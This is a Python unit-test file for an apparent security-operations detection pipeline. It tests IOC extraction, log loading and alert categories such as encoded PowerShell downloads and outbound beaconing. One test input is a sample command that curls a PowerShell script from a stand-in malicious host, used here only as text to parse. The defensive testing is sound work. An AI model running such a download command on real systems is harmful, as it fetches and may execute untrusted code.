from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from soc_pipeline.ioc import extract_iocs_from_text
from soc_pipeline.loader import load_csv
from soc_pipeline.pipeline import run_pipeline


PROJECT_ROOT = Path(__file__).resolve().parents[1]
SAMPLE_LOGS = PROJECT_ROOT / "data" / "sample_logs.csv"


class PipelineTests(unittest.TestCase):
    def test_ioc_extraction_finds_domains_ips_and_hashes(self) -> None:
        iocs = extract_iocs_from_text(
            "curl http://malicious-update.test/a.ps1 from 203.0.113.9 "
            "hash 9f2c1a7b3e4d5c6f88990011aabbccddeeff00112233445566778899aabbccdd"
        )
        self.assertIn("203.0.113.9", iocs["ip_addresses"])
        self.assertIn("malicious-update.test", iocs["domains"])
        self.assertIn(
            "9f2c1a7b3e4d5c6f88990011aabbccddeeff00112233445566778899aabbccdd",
            iocs["hashes"],
        )

    def test_loader_parses_sample_dataset(self) -> None:
        events = load_csv(SAMPLE_LOGS)
        self.assertGreaterEqual(len(events), 15)
        self.assertEqual(events[0].event_type, "auth")

    def test_pipeline_generates_expected_detection_categories(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            alerts = run_pipeline(SAMPLE_LOGS, temp_dir)
            titles = {alert.title for alert in alerts}
            self.assertIn("Successful login after brute force pattern", titles)
            self.assertIn("Encoded PowerShell download activity", titles)
            self.assertIn("Privileged group membership change", titles)
            self.assertIn("Periodic outbound beaconing pattern", titles)
            self.assertIn("Large outbound data transfer", titles)
            self.assertTrue((Path(temp_dir) / "alerts.json").exists())
            self.assertTrue((Path(temp_dir) / "triage_queue.csv").exists())
            self.assertTrue((Path(temp_dir) / "soc_investigation_report.md").exists())


if __name__ == "__main__":
    unittest.main()
